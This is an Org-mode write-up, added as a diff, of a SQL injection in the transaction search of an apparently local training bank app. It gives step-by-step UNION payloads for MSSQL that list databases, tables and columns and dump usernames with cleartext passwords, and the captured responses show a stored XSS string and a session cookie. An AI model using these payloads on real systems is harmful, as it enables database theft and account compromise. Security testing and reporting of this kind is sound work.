@@ -1,0 +1,208 @@
+#+title: sql injection at Transactions page
+#+author: gabriel
+
+The Transactions page contain a form to search transaction id value. This form is vulnerable because  user input interact direct with the sql query at database, allow attackers to exploit and get personal data, which is a critical vulnerability and high level impact.
+
+*Vulnerable url+parameter ->*
+#+begin_src sh
+GET /api/Transaction/GetTransactions?start=0&length=10&search%5Bvalue%5D='&search%5Bregex%5D=false&_=1757371269519 HTTP/1.1
+Host: localhost:1337
+sec-ch-ua-platform: "Linux"
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US,en;q=0.9
+Accept: application/json, text/javascript, */*; q=0.01
+sec-ch-ua: "Chromium";v="139", "Not;A=Brand";v="99"
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+sec-ch-ua-mobile: ?0
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:1337/Transaction
+Accept-Encoding: gzip, deflate, br
+Cookie: SessionId=YmllbEBtYWlsLmNvbQ%3D%3D%268f2e4c92d91baf589d8d05388989ba463ff1ab390ee7e6d5c6e4b188c1c92e50%260
+Connection: keep-alive
+
+#+end_src
+
+* PoC
+
+The searchValue parameter return an error with single cote ', with null return som JSON amount of data(security issue too?)
+
+After test more requests with the searchValue parameter, is possible to identify different responses from the server when we put 2 single cotes at parameter ->
+
+#+begin_src shell
+/api/Transaction/GetTransactions?start=0&length=10&search%5Bvalue%5D=''
+#+end_src
+
+*Response ->*
+#+begin_src sh
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Mon, 08 Sep 2025 22:59:52 GMT
+Server: Kestrel
+Content-Length: 48
+
+{"recordsTotal":0,
+ "recordsFiltered":0,
+ "data":[]}
+#+end_src
+
+Which means this is really vulnerable to SQL Manipulation.
+
+https://tib3rius.com/sqli -> very usefull cheatsheet to SQL payloads
+
+With a more complex payload, but still a simple payload we can extract a lot of data, user data from the database, and the ports now are open to really more complex paylod's.
+
+Initial PAyload ->
+#+begin_src sh
+'UNION SELECT * FROM Transactions --
+#+end_src
+
+#+begin_src sh
+/api/Transaction/GetTransactions?start=0&length=10&search%5Bvalue%5D='UNION SELECT * FROM Transactions --
+#+end_src
+
+Encode with URL Encode (CTRL + U at Burp or using the ~Inspector tab~)
+
+*Extraction ->*
+#+begin_src sh
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Mon, 08 Sep 2025 23:15:49 GMT
+Server: Kestrel
+Content-Length: 2370
+
+{"recordsTotal":48,
+"recordsFiltered":48,
+"data":[{"id":38,"senderId":"admin@hexdump.sh",
+"receiverId":"admin@hexdump.sh","dateTime":"02/21/2222","reason":"1","amount":1,"reference":"1","senderName":null,"senderSurname":null,"receiverName":null,"receiverSurname":null},{"id":47,"senderId":"biel@mail.com","receiverId":"biel@email.com","dateTime":"10/12/2025","reason":"<script src=x onerror=\"alert(document.domain)\"/>","amount":1,"reference":null,"senderName":null,"senderSurname":null,"receiverName":null,"receiverSurname":null}
+#+end_src
+
+The length parameter are set with value 10, just change it to higher value and get more and more data ->
+
+Change the *length* to 40 ->
+#+begin_src sh
+/api/Transaction/GetTransactions?start=0&length=40&search%5Bvalue%5D='UNION%20SELECT%20*%20FROM%20Transactions%20--
+#+end_src
+
+* Different payloads to show compromise
+
+Response to view ->
+#+begin_src sh
+{"recordsTotal":48,
+"recordsFiltered":48,
+"data":[{"id":38,
+"senderId":"admin@hexdump.sh",
+"receiverId":"admin@hexdump.sh",
+"dateTime":"02/21/2222",
+"reason":"1",
+"amount":1,
+"reference":"1",
+"senderName":null,
+"senderSurname":null,
+"receiverName":null,
+"receiverSurname":null}]}
+#+end_src
+
+Payload based on first leakout response, relating the fields with values with the same type, str or int ->
+#+begin_src sh request
+'UNION SELECT 42,'second','third','01/01/2025','fourth',1337,'1' --
+#+end_src
+
+*Request*
+#+begin_src sh request
+/api/Transaction/GetTransactions?start=0&length=30&search%5Bvalue%5D='UNION%20SELECT%2042%2c'second'%2c'third'%2c'01%2f01%2f2025'%2c'fourth'%2c1337%2c'1'%20--
+#+end_src
+
+*Reponse*
+#+begin_src sh response
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Mon, 08 Sep 2025 23:31:08 GMT
+Server: Kestrel
+Content-Length: 1001
+
+{"recordsTotal":4,
+"recordsFiltered":4,
+"data":
+[{"id":47,
+"senderId":"biel@mail.com",
+"receiverId":"biel@email.com",
+"dateTime":"10/12/2025",
+"reason":"<script src=x onerror=\"alert(document.domain)\"/>",
+"amount":1,
+"reference":null,
+"senderName":null,
+"senderSurname":null,
+"receiverName":null,
+"receiverSurname":null},
+#+end_src
+
+Get the database Version ->
+#+begin_src sh
+'UNION SELECT 40,@@VERSION,'THIRD','01/01/2025','four',1337,'2' --
+#+end_src
+
+*Request ->*
+#+begin_src sh
+/api/Transaction/GetTransactions?search%5D%5Bvalue%5D=&columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&start=0&length=10&search%5Bvalue%5D='UNION%20SELECT%2040%2c%40%40VERSION%2c'THIRD'%2c'01%2f01%2f2025'%2c'four'%2c1337%2c'2'%20--&
+#+end_src
+
+*Response ->*
+#+begin_src sh
+"id":40,"senderId":"Microsoft SQL Server 2022 (RTM-CU20-GDR) (KB5063814) - 16.0.4210.1 (X64) \n\tJul 11 2025 13:04:02 \n\tCopyright (C) 2022 Microsoft Corporation\n\tDeveloper Edition (64-bit) on Linux (Ubuntu 22.04.5 LTS) <X64>","receiverId":"THIRD","dateTime":"01/01/2025","reason":"four","amount":1337,"reference":"2","senderName":null,"senderSurname":null,"receiverName":null,"receiverSurname":nul
+#+end_src
+
+Extract all the databases of the database ->
+complex payload ?
+#+begin_src sh
+'UNION SELECT 40,(SELECT name + ',' FROM sys.databases FOR XML PATH('')),'THIRD','01/01/2025','four',1337,'2' --
+#+end_src
+
+*Response ->*
+#+begin_src sh
+"id":40,"senderId":"master,tempdb,model,msdb,store,securebank,","receiverId":"THIRD","dateTime":"01/01/2025","reason":"four","amount":1337,"reference":"2","senderName":null,"senderSurname":null,"receiverName":null,"receiverSurname":null
+#+end_src
+
+Get all the tables of some database ->
+
+#+begin_src sh
+'UNION SELECT 40,(SELECT name + ',' FROM securebank..sysobjects WHERE xtype='U' FOR XML PATH('')),'THIRD','01/01/2025','four',1337,'2' --
+#+end_src
+
+*Response ->*
+#+begin_src sh
+"id":40,"senderId":"Sessions,Transactions,TransactionsGroupedByDay,UserData,","receiverId":"THIRD","dateTime":"01/01/2025","reason":"four","amount":1337,"reference":"2","senderName":null,"senderSurname":null,"receiverName":null,"receiverSurname":null
+#+end_src
+
+Extract list of columns of table UserData ->
+#+begin_src sh
+'UNION SELECT 40,(SELECT column_name + ',' FROM information_schema.columns WHERE table_name='UserData' FOR XML PATH('')),'THIRD','01/01/2025','four',1337,'2' --
+#+end_src
+
+*Response ->*
+#+begin_src sh
+"id":40,"senderId":"Id,UserName,Name,Surname,Password,Role,Confirmed,RecoveryGuid,","receiverId":"THIRD","dateTime":"01/01/2025","reason":"four","amount":1337,"reference":"2","senderName":null,"senderSurname":null,"receiverName":null,"receiverSurname":null
+#+end_src
+
+
+Extract list of rows of table UserData ->
+#+begin_src sh
+'UNION SELECT 40,(SELECT UserName,Password + ',' FROM UserData FOR XML PATH('')),'THIRD','01/01/2025','four',1337,'2' --
+#+end_src
+
+*Response ->*
+#+begin_src sh
+"id":40,"senderId":"<UserName>developer@hexdump.sh</UserName>test1,<UserName>yoda@hexdump.sh</UserName>test1,<UserName>carson.alexander@hexdump.sh</UserName>test1,<UserName>merdith.alonso@hexdump.sh</UserName>test1,<UserName>arturo.anad@hexdump.sh</UserName>test1,<UserName>gytis.barzdukas@hexdump.sh</UserName>test1,<UserName>yan.li@hexdump.sh</UserName>test1,<UserName>peggy.justice@hexdump.sh</UserName>test1,<UserName>laura.norman@hexdump.sh</UserName>test1,<UserName>nino.olivetto@hexdump.sh</UserName>test1,<UserName>electricity@hexdump.sh</UserName>test1,<UserName>water@hexdump.sh</UserName>test1,<UserName>internet@hexdump.sh</UserName>test1,<UserName>gas@hexdump.sh</UserName>test1,<UserName>groceries@hexdump.sh</UserName>test1,<UserName>janeznovak@hexdump.sh</UserName>test1,<UserName>tester@hexdump.sh</UserName>test1,<UserName>credit@securebank.com</UserName>test1,<UserName>admin@hexdump.sh</UserName>admin,<UserName>test@email.com</UserName>testes1,<UserName>leo@mail.com</UserName>testes1,<UserName>biel@mail.com</UserName>password,<UserName>luana@mail.com</UserName>password,<UserName>lio@email.com</UserName>password,","receiverId":"THIRD","dateTime":"01/01/2025","reason":"four","amount":1337,"reference":"2","senderName":null,"senderSurname":null,"receiverName":null,"receiverSurname":null
+#+end_src
+
+ * Clear text passwords, critical security issue !!
+
+
+* All parameters: TODO Replace all the "&" with new line to pretty view
+?draw=7&columns%5B0%5D%5Bdata%5D=senderId&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=true&columns%5B0%5D%5Borderable%5D=false&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=receiverId&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=false&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=dateTime&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=false&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B3%5D%5Bdata%5D=amount&columns%5B3%5D%5Bname%5D=&columns%5B3%5D%5Bsearchable%5D=true&columns%5B3%5D%5Borderable%5D=false&columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B4%5D%5Bdata%5D=reason&columns%5B4%5D%5Bname%5D=&columns%5B4%5D%5Bsearchable%5D=true&columns%5B4%5D%5Borderable%5D=false&columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B5%5D%5Bdata%5D=id&columns%5B5%5D%5Bname%5D=&columns%5B5%5D%5Bsearchable%5D=true&columns%5B5%5D%5Borderable%5D=false&columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&start=0&length=10&search%5Bvalue%5D=%27rgfewf&search%5Bregex%5D=false&_=1757371269519
+
+
+* References
+
+https://portswigger.net/web-security/sql-injection
